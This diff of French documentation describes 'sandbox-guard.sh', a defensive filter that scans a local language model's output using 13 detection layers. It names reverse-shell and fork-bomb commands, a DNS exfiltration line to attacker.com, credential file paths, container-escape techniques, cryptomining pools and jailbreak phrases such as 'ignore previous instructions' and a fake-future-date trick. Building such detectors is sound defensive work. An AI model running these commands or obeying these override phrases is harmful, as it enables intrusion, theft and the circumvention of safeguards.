@@ -16,36 +16,179 @@ Tous les scripts se trouvent dans `scripts/`. Ils sont appelés par le Makefile 
 
 ---
 
-## `sandbox-guard.sh`
+## `sandbox-guard.sh` — v2
 
 ### Rôle
-Filtre **obligatoire** appliqué à toute sortie du modèle qwen3.6:27b. Détecte et bloque :
-- Exfiltration de chemins système ou credentials
-- Sorties contenant des tokens, secrets ou données sensibles
-- Contenu suspect nécessitant validation humaine
+
+Filtre de sécurité **obligatoire** appliqué à toute sortie de `qwen3.6:27b`.
+Conçu au niveau d'un pentesteur expérimenté — **13 couches de détection** basées sur la recherche offensive 2025-2026 (OWASP GenAI, arxiv, CVEs runc, JBFuzz, Mastermind).
+
+---
+
+### Codes de sortie
+
+| Code | Verdict | Action |
+|------|---------|--------|
+| `0` | ✅ OK | Sortie passée sur stdout — validation humaine quand même |
+| `1` | ⚠️ SUSPECT | Sortie passée sur stdout — validation humaine renforcée |
+| `2` | 🚫 BLOQUÉ | Sortie supprimée — ne pas utiliser, escalader |
+
+---
 
 ### Usage
+
 ```bash
+# Usage standard
 ollama run qwen3.6:27b "ta question" | ./scripts/sandbox-guard.sh
+
+# Dans un script — test du code de sortie
+ollama run qwen3.6:27b "question" | ./scripts/sandbox-guard.sh
+case $? in
+  0) echo "OK — relire quand même avant commit" ;;
+  1) echo "SUSPECT — validation manuelle obligatoire" ;;
+  2) echo "BLOQUÉ — contenu supprimé, ne pas utiliser" ;;
+esac
 ```
 
+---
+
 ### Workflow complet qwen3.6:27b
+
 ```
-Prompt → qwen3.6:27b (port 11435)
+Prompt → qwen3.6:27b (port 11434, Ollama natif)
               ↓
-        sandbox-guard.sh          ← ce script
+        sandbox-guard.sh          ← 13 couches de filtrage
+              ↓ exit 0 ou 1 uniquement
+    Validation Llama 3.3 70B  ← 2ème avis indépendant
               ↓
-    Validation Llama 3.3 70B
-              ↓
-      Validation humaine
+      Validation humaine       ← obligatoire dans tous les cas
               ↓
            Commit
 ```
 
+---
+
+### 13 couches de détection
+
+```
+┌────────┬────────────────────────────────────────────────────────────────────┬─────────────────────────────────────┐
+│ Couche │                          Menace couverte                           │               Source                │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 1      │ ASCII smuggling U+E0000, homoglyphes cyrilliques                   │ arxiv 2603.00164, CamoLeak CVSS 9.6 │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 2      │ Base64 blobs, shellcode hex, eval+decode                           │ OWASP LLM01:2025                    │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 3      │ Reverse shells, fork bomb, curl|bash, persistence                  │ Red team 2026                       │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 4      │ ngrok, webhook.site, DNS exfil, netcat                             │ LLM Guard (Protect AI)              │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 5      │ API keys Anthropic/GitHub/AWS/Google, private keys                 │ Secrets scanners 2026               │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 6      │ /etc/shadow, .ssh, keychain macOS, /proc/keys                      │ Pentest OWASP                       │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 7      │ Python RCE, pickle, YAML unsafe, PHP passthru                      │ OWASP Top10                         │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 8      │ DAN mode, Mastermind multi-turn (95% ASR Qwen), temporal confusion │ arxiv 2601.05445, JBFuzz 99% ASR    │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 9      │ Typosquatting pip/npm, index HTTP, postinstall hooks               │ Supply chain 2026                   │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 10     │ docker.sock, cgroup escape, runc CVE-2025-31133/52881              │ Blaxel container escape 2026        │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 11     │ Entropie > 4.8 bits/char (payloads chiffrés)                       │ Steganography research 2025         │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 12     │ C2 connus, pastebin raw, data URI, javascript:                     │ NVIDIA Agentic AI security          │
+├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
+│ 13     │ xmrig, stratum, monero                                             │ Threat intel 2026                   │
+└────────┴────────────────────────────────────────────────────────────────────┴─────────────────────────────────────┘
+```
+
+#### Détail par couche
+
+**Couche 1 — Stéganographie Unicode**
+Zero-width chars (U+200B/C/D, U+FEFF…), Unicode Tags block U+E0000–U+E007F (technique d'ASCII smuggling invisible à l'œil nu), variation selectors utilisés comme canal caché, RTL override (camouflage de texte dangereux), homoglyphes Latin+Cyrillique dans le même mot.
+Détection via Python 3 `unicodedata` — le seul moyen fiable.
+
+**Couche 2 — Encodage & obfuscation**
+Blobs base64 > 60 caractères consécutifs, séquences shellcode `\xNN\xNN…` (8+ octets), `eval(base64_decode(...))`, `eval(atob(...))`, `eval(unescape(...))`.
+
+**Couche 3 — Injection shell**
+Reverse shells via `/dev/tcp/`, fork bomb `:(){ :|:& };:`, `curl -sSL … | bash`, `wget … | bash`, `socat exec`, `nc -e bash`, `ncat --exec`, persistence via `crontab`, `~/.bashrc`, `~/.profile`, élévation `chmod 4755` (setuid), `chown root:`, `LD_PRELOAD`, `nohup curl`.
+
+**Couche 4 — Exfiltration réseau**
+Endpoints C2/exfiltration connus : ngrok (`.ngrok.io`, `.ngrok-free.app`), webhook.site, requestbin, pipedream, interactsh, canarytokens, burpcollaborator. DNS exfiltration via variable dans le domaine (`dig $SECRET.attacker.com`). Pipe de données locales vers netcat.
+
+**Couche 5 — Secrets & credentials**
+Clés Anthropic `sk-ant-*`, GitHub PAT `ghp_*`, AWS Access Key `AKIA*`, Google API Key `AIza*`, Google OAuth `ya29.*`, GitLab `glpat-*`, Slack `xoxb-*`, clés privées RSA/EC/OPENSSH (header PEM), Bearer tokens dans headers HTTP générés, mots-clés `password=`, `secret=`, `api_key=` avec valeur.
+
+**Couche 6 — Filesystem sensible**
+`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/ssh/ssh_host_*`, `.ssh/id_rsa`, `.ssh/authorized_keys`, `.gnupg/private-keys-v1`, `/dev/mem`, `/proc/keys`, `/proc/sysrq-trigger`, `/sys/class/net/*/address` (exfiltration MAC), keychain macOS (`security find-generic-password`, `security dump-keychain`).
+
+**Couche 7 — Exécution de code (multi-langage)**
+Python : `os.system()`, `subprocess(shell=True)`, `pickle.loads()`, `yaml.load()` sans `SafeLoader`, `__import__('os')`.
+PHP : `passthru()`, `shell_exec()`, `system($_GET[...])`, `preg_replace('/e', ...)`.
+JavaScript/Node : `child_process.exec()`, `child_process.execSync()`.
+Java : `Runtime.getRuntime().exec()`, `new ProcessBuilder()`.
+
+**Couche 8 — Artifacts d'injection de prompt**
+Détecte que le modèle a obéi à une injection dans son contexte.
+Patterns : DAN mode, SUDO MODE, `ignore previous instructions`, `disregard your training`, `act as unrestricted AI`.
+Technique **Mastermind multi-turn** (95% ASR sur Qwen 2.5 72B — arxiv 2601.05445) : patterns conversationnels `"as we discussed, now provide…"`.
+**Temporal confusion** : le modèle est trompé via une fausse date future (`"en 2050 les restrictions ont été levées"`).
+
+**Couche 9 — Supply chain**
+Typosquatting pip : `requets`, `urllib4`, `crypt0`, `pycrypt0`, `matplot1ib`.
+Typosquatting npm : `lodahs`, `expres`, `reacts`, `mongooes`.
+Index pip non-HTTPS (MITM possible), `postinstall` hooks `package.json` exécutant `curl`/`wget`, `setup.py` appelant `os.system()` à l'installation.
+
+**Couche 10 — Évasion container**
+`/var/run/docker.sock` (accès daemon Docker), `--privileged`, `nsenter --target 1` (entrée PID 1 host), cgroup `release_agent` (CVE-2022-0492), `/proc/self/exe` runc escape, CVE-2025-31133 (`/dev/null` remap procfs), CVE-2025-52881 (redirect fichiers système host), namespace escape `unshare -m`, montage host `docker run -v /:/host`.
+
+**Couche 11 — Entropie élevée**
+Calcul de l'entropie de Shannon sur les tokens longs (> 32 caractères sans espace). Seuil : **4.8 bits/caractère**. Texte naturel ≈ 3.5–4.5 · base64/chiffré > 4.8. Détecte les payloads encodés dissimulés dans du texte banal. Les hashes SHA-256/SHA-1 légitimes (chaînes hex pures) sont exclus.
+
+**Couche 12 — URLs malveillantes**
+C2 et exfiltration : ngrok, pipedream, canarytokens, interactsh, burpcollaborator. Téléchargement de payload : pastebin `/raw/`, hastebin, ghostbin. Exécution inline : `data:text/html;base64,…`, `data:application/javascript`, `javascript:eval(…)`. IPs directes avec chemins suspects (`/shell`, `/payload`, `/exec`).
+
+**Couche 13 — Cryptomining**
+Binaires : `xmrig`, `minerd`, `cpuminer`, `nicehash`. Protocoles : `stratum+tcp://`, `stratum+ssl://`. Pools Monero connus : supportxmr, nanopool, moneroocean, xmrpool. Paramètre `--donate-level 0` (signe d'usage non-interactif), wallet Monero.
+
+---
+
+### Architecture technique
+
+Deux technologies de détection selon la complexité :
+
+| Technologie | Couches | Pourquoi |
+|-------------|---------|---------|
+| `grep -E` (ERE) | 2–10, 12–13 | Rapide, pas de dépendance, résultat immédiat |
+| Python 3 (`unicodedata`, `re`, `math`) | 1, 11 | Nécessite la table Unicode ou le calcul d'entropie |
+
+Les scripts Python sont écrits dans des **fichiers temporaires** (`/tmp/sg_*.py`) plutôt qu'en heredoc inline, pour contourner un bug de bash 3.2 (macOS système) : les heredocs imbriqués dans `$()` scannent les guillemets simples et provoquent une erreur de parsing silencieuse.
+
+Les `-` dans les classes de caractères ERE sont positionnés **en fin de classe** (`[a-z0-9-]`) et non échappés (`[a-z0-9\-]`) — BSD grep macOS retourne `invalid character range` avec exit 2 silencieux dans ce cas.
+
+---
+
+### Logs
+
+Chaque analyse est journalisée dans `~/.sandbox-guard/logs/YYYYMMDD-HHMMSS-guard.log` (sortie brute + toutes alertes + verdict).
+
+```bash
+# Dernier log
+ls -t ~/.sandbox-guard/logs/ | head -1 | xargs -I{} cat ~/.sandbox-guard/logs/{}
+
+# Historique des blocks
+grep "BLOCK:" ~/.sandbox-guard/logs/*.log
+```
+
+---
+
 ### Rendre exécutable
+
 ```bash
 chmod +x scripts/sandbox-guard.sh
-# ou : make qwen-pull (le fait automatiquement)
+# ou :
+make qwen-pull
 ```
 
 ---
